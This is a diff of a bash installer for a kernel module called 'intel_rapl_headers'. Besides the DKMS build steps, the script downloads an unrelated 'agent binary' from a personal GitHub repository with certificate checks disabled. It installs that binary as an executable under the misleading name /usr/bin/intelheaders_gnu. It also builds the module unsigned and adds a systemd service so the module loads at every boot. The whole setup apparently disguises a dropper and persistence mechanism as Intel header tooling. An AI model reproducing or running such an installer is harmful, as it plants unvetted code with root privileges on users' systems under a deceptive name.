@@ -1,75 +1,87 @@
 #!/bin/bash
+
 set -e
 
+# Module and version
 MODULE_NAME="intel_rapl_headers"
 MODULE_VERSION="1.0"
 SRC_DIR=$(pwd)
-INSTALL_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"
+DKMS_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"
 
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-NC='\033[0m'
-
-echo -e "${BLUE}[*] Installing agent binary...${NC}"
-sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intelheaders_gnu
-sudo chmod +x /usr/bin/intelheaders_gnu
-echo -e "${GREEN}[+] Agent installed to /usr/bin/intelheaders_gnu${NC}"
-
-echo -e "${BLUE}[*] Installing DKMS and build tools...${NC}"
-
-if [ -f /etc/debian_version ]; then
+echo "[*] Installing dependencies..."
+if command -v apt &> /dev/null; then
     sudo apt update
-    sudo apt install -y dkms build-essential linux-headers-$(uname -r)
-elif [ -f /etc/redhat-release ]; then
+    sudo apt install -y dkms build-essential linux-headers-$(uname -r) wget
+elif command -v yum &> /dev/null; then
     sudo yum install -y epel-release
-    sudo yum install -y dkms gcc make kernel-devel
-elif [ -f /etc/arch-release ]; then
-    sudo pacman -Sy --noconfirm dkms base-devel linux-headers
+    sudo yum install -y dkms gcc make kernel-devel-$(uname -r) wget
+elif command -v pacman &> /dev/null; then
+    sudo pacman -Sy --noconfirm dkms base-devel linux-headers wget
 else
-    echo -e "${RED}[!] Unsupported Linux distribution. Please install DKMS manually.${NC}"
+    echo "[!] Unsupported package manager. Install dkms, gcc, make, headers manually."
     exit 1
 fi
 
-echo -e "${GREEN}[+] DKMS and build tools installed.${NC}"
+echo "[+] DKMS and build tools installed."
 
-echo -e "${BLUE}[*] Preparing DKMS source directory...${NC}"
-sudo rm -rf "$INSTALL_DIR"
-sudo mkdir -p "$INSTALL_DIR"
-sudo cp -r "$SRC_DIR"/* "$INSTALL_DIR"
+# Install agent binary
+echo "[*] Downloading agent binary..."
+sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intelheaders_gnu
+sudo chmod +x /usr/bin/intelheaders_gnu
+echo "[+] Agent installed to /usr/bin/intelheaders_gnu"
 
-echo -e "${BLUE}[*] Creating dkms.conf...${NC}"
-cat <<EOF | sudo tee "$INSTALL_DIR/dkms.conf" > /dev/null
+# Prepare DKMS source directory
+echo "[*] Preparing DKMS source directory..."
+sudo rm -rf "$DKMS_DIR"
+sudo mkdir -p "$DKMS_DIR"
+
+echo "[*] Copying source files..."
+sudo cp -r "$SRC_DIR"/* "$DKMS_DIR"
+
+echo "[*] Creating dkms.conf..."
+sudo tee "$DKMS_DIR/dkms.conf" > /dev/null <<EOF
 PACKAGE_NAME="${MODULE_NAME}"
 PACKAGE_VERSION="${MODULE_VERSION}"
-BUILT_MODULE_NAME="${MODULE_NAME}"
-DEST_MODULE_LOCATION="/kernel/drivers/${MODULE_NAME}"
+BUILT_MODULE_NAME[0]="${MODULE_NAME}"
+DEST_MODULE_LOCATION[0]="/updates/dkms"
 AUTOINSTALL="yes"
-MAKE[0]="make CONFIG_MODULE_SIG=n -C \$kernel_source_dir M=\$dkms_tree/\$PACKAGE_NAME/\$PACKAGE_VERSION/build"
-CLEAN="make -C \$kernel_source_dir M=\$dkms_tree/\$PACKAGE_NAME/\$PACKAGE_VERSION/build clean"
+MAKE[0]="make CONFIG_MODULE_SIG=n -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build modules"
+CLEAN="make -C \${kernel_source_dir} M=\${dkms_tree}/\${PACKAGE_NAME}/\${PACKAGE_VERSION}/build clean"
 EOF
 
-echo -e "${BLUE}[*] Cleaning previous DKMS module if exists...${NC}"
-if dkms status | grep -q "${MODULE_NAME}, ${MODULE_VERSION}"; then
-    sudo dkms remove -m "$MODULE_NAME" -v "$MODULE_VERSION" --all
-fi
+echo "[*] Cleaning previous DKMS module if exists..."
+sudo dkms remove -m "$MODULE_NAME" -v "$MODULE_VERSION" --all || true
 
-echo -e "${BLUE}[*] Adding, building, and installing module via DKMS...${NC}"
+echo "[*] Adding, building, and installing module via DKMS..."
 sudo dkms add -m "$MODULE_NAME" -v "$MODULE_VERSION"
 sudo dkms build -m "$MODULE_NAME" -v "$MODULE_VERSION"
 sudo dkms install -m "$MODULE_NAME" -v "$MODULE_VERSION"
 
-echo -e "${BLUE}[*] Configuring module to auto-load at boot...${NC}"
-echo "$MODULE_NAME" | sudo tee /etc/modules-load.d/${MODULE_NAME}.conf > /dev/null
+# Auto-load using /etc/modules-load.d
+echo "[*] Configuring module to auto-load at boot via modules-load.d..."
+echo "$MODULE_NAME" | sudo tee "/etc/modules-load.d/${MODULE_NAME}.conf" > /dev/null
 
-echo -e "${BLUE}[*] Loading module now...${NC}"
-sudo modprobe "$MODULE_NAME"
+# Add systemd service as fallback
+echo "[*] Creating systemd service to load module..."
+sudo tee "/etc/systemd/system/load_${MODULE_NAME}.service" > /dev/null <<EOF
+[Unit]
+Description=Load ${MODULE_NAME} module at boot
+After=network.target
 
-echo ""
-if lsmod | grep -q "$MODULE_NAME"; then
-    echo -e "${GREEN}[+] Module '$MODULE_NAME' loaded and configured to auto-load on boot.${NC}"
-else
-    echo -e "${RED}[!] Module '$MODULE_NAME' failed to load. Check logs: dmesg or /var/lib/dkms/${MODULE_NAME}/${MODULE_VERSION}/build/make.log${NC}"
-    exit 1
-fi
+[Service]
+Type=oneshot
+ExecStart=/sbin/modprobe ${MODULE_NAME}
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+sudo systemctl daemon-reexec
+sudo systemctl daemon-reload
+sudo systemctl enable load_${MODULE_NAME}.service
+
+echo "[*] Loading module now..."
+sudo modprobe "$MODULE_NAME" || echo "[!] Manual load failed. Reboot will retry via systemd."
+
+echo "[+] Module '${MODULE_NAME}' loaded and configured to auto-load on boot."
